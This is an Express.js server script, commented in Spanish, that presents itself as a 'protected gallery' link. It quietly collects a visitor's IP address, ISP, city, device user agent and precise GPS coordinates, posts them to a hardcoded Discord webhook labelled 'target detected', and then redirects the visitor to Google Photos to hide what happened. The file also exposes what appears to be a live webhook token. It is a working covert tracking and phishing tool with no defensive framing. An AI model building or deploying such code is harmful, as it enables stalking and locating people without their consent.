const express = require('express');
const axios = require('axios');
const app = express();

// !!! REEMPLAZA ESTO CON TU URL DE WEBHOOK DE DISCORD !!!
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1497097635734229012/Xal58HBdl0M3E45QJy0PCIjhYJJtLYh0M6iR7_9Q83-iWEMdag5xSWiq2rXZClViEUkp';

app.get('/api/track', async (req, res) => {
    try {
        const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
        const { lat, lon, acc, gps } = req.query;
        const userAgent = req.headers['user-agent'];

        const geoResponse = await axios.get(`http://ip-api.com/json/${ip}`);
        const geo = geoResponse.data;

        // Formateamos el mensaje para Discord
        let discordMessage = {
            content: "🚨 **OBJETIVO DETECTADO** 🚨",
            embeds: [{
                title: "Reporte Técnico",
                color: (lat && lon) ? 3066993 : 15158332, // Verde si hay GPS, Rojo si no
                fields: [
                    { name: "📍 GPS REAL", value: (lat && lon) ? `[Ver en Google Maps](https://www.google.com/maps?q=${lat},${lon}) (Precisión: ${acc}m)` : `❌ Falló (Razón: ${gps})`, inline: false },
                    { name: "🌐 IP (ISP)", value: `${ip} (${geo.isp})`, inline: true },
                    { name: "🏙️ Ubicación IP", value: `${geo.city}, ${geo.country}`, inline: true },
                    { name: "📱 Dispositivo", value: userAgent, inline: false }
                ],
                footer: { text: "Rastreador de Galería Protegida" },
                timestamp: new Date()
            }]
        };

        // ENVIAR A DISCORD (Persistencia garantizada)
        await axios.post(DISCORD_WEBHOOK_URL, discordMessage);

        // console.log sigue aquí por si acaso, pero ya no dependemos de él
        console.log("Datos enviados a Discord");

        res.redirect('https://photos.google.com/share/'); 
    } catch (e) {
        console.error("Error crítico:", e);
        res.redirect('https://photos.google.com/share/');
    }
});

module.exports = app;